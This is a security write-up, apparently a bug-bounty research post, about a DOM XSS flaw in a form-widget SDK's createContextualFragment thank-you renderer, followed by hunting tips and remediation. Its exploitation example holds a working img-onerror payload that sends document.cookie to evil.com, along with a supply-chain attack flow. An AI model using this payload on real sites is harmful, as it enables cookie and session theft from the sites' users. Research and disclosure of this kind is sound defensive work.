DOM XSS via createContextualFragment in Widget SDK

Inspired by xssdoctor's widget supply-chain research · Affects 50+ bug bounty targets

Vulnerability

A major form widget SDK uses document.createRange().createContextualFragment() to render the "thank you" message after form submission. This DOM API parses HTML and executes event handlers like onerror, onload, etc. The message content comes from the form configuration API — unauthenticated and publicly accessible.

The Discovery

While auditing third-party widgets embedded on bug bounty targets, the researcher downloaded the form SDK (606KB minified) and searched for dangerous DOM sinks. The grep output was eye-opening:

grep -n 'innerHTML\|createContextualFragment\|dangerouslySetInnerHTML' forms-v2.js

Line 5618: this.getWindow().postMessage({...}, "*")
Line 7146: document.createRange().createContextualFragment(a)
Line 3200: dangerouslySetInnerHTML:{__html:n}  // 10+ instances

The most dangerous sink was the createContextualFragment call in the "Py" component — the thank-you message renderer:

const Py = ({message: a}) => {
    const i = useRef(null);
    useEffect(() => {
        i.current.innerHTML && (i.current.innerHTML = "");
        // VULNERABLE: parses AND executes HTML
        const e = document.createRange().createContextualFragment(a);
        i.current.appendChild(e);
    }, [a]);
    return <div ref={i} className="submitted-message" />;
};

Why createContextualFragment is Dangerous

Most developers know innerHTML is dangerous. But createContextualFragment is worse in a subtle way: it creates a DocumentFragment by parsing HTML, and during the parsing process, event handlers are immediately activated. Even sanitizers that strip <script> tags often miss event handlers processed by this API.

Key differences from innerHTML:

  • innerHTML on a detached element won't execute scripts (they need to be inserted into DOM via appendChild)
  • createContextualFragment executes event handlers during fragment creation, before the fragment is even appended to the DOM
  • Custom sanitizers that process the HTML string before passing to createContextualFragment may strip <script> but miss <img onerror> because they don't recognize all event handler attributes

Exploitation

1. Direct DOM XSS (if site passes URL params to config)

Any website that passes URL-controlled data to the inlineMessage config option is vulnerable to reflected DOM XSS:

<script src="https://js.hsforms.net/forms/v2.js"></script>
<script>
hbspt.forms.create({
    portalId: '7168674',
    formId: '47a51496-1ae7-487c-be98-374ded6b07fe',
    target: '#form-target',
    inlineMessage: '<img src=x onerror="document.location=\'https://evil.com/steal?c=\'+document.cookie">',
    showInlineMessageInitially: true
});
</script>

2. Supply Chain XSS (stored via admin panel)

A compromised admin account can modify the form configuration's inlineMessage field. The payload is stored server-side and served to every website embedding that form. One compromised form definition = XSS on potentially thousands of sites.

3. Additional Sinks Found

Beyond createContextualFragment, 10+ React components use dangerouslySetInnerHTML for rendering form labels, descriptions, footers, consent text, and rich text blocks. All controlled by the form configuration API.

Why It Matters

This is supply-chain XSS. The form SDK is loaded on 50+ bug bounty targets including major platforms. A single malicious form configuration propagates XSS to every site embedding it. Impact: cookie theft, session hijacking, credential harvesting, phishing overlays — all on trusted domains.

Confirmed Targets

57 bug bounty targets confirmed to load the vulnerable SDK, including sites handling user credentials, payment information, and PII. The form configuration API is publicly accessible without authentication at predictable URLs.

Attack Flow

1

Attacker compromises form admin account (phishing, credential stuffing, insider)

↓
2

Modifies inlineMessage to include <img src=x onerror=...>

↓
3

Form config API serves the malicious HTML to all embedding sites

↓
4

createContextualFragment() parses and executes the payload on each site

↓
5

XSS fires in the context of each embedding domain — stealing cookies, sessions, credentials

Bug Bounty Tip

When hunting for DOM XSS, don't just grep for innerHTML. Search for createContextualFragment, insertAdjacentHTML, document.write, srcdoc, and jQuery's .html(). These are all sinks that parse and execute HTML, but are less commonly checked by sanitizers and security reviews.

Remediation

  • Replace createContextualFragment with DOMPurify sanitization before DOM insertion
  • Use textContent instead of HTML-parsing APIs for user-visible messages
  • Implement CSP with strict nonce-based script-src on embedding pages
  • Add input validation on the form configuration API to reject HTML event handlers
